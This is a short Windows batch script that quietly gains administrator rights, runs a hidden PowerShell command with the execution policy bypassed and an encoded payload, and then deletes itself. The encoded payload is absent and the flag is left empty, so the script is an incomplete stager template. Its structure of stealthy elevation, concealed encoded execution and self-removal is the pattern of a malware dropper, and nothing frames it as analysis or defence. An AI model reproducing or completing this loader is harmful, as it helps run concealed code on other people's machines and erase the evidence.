@echo off
net session >nul 2>&1
if %errorLevel% neq 0 (
    powershell -NoProfile -Command "Start-Process '%~f0' -Verb runAs -WindowStyle Hidden"
    exit /b
)

powershell -NoProfile -ExecutionPolicy Bypass -WindowStyle Hidden -EncodedCommand 

set "SELF=%~f0"
start "" /b cmd /c "timeout /t 3 >nul & del /f /q "%SELF%""
exit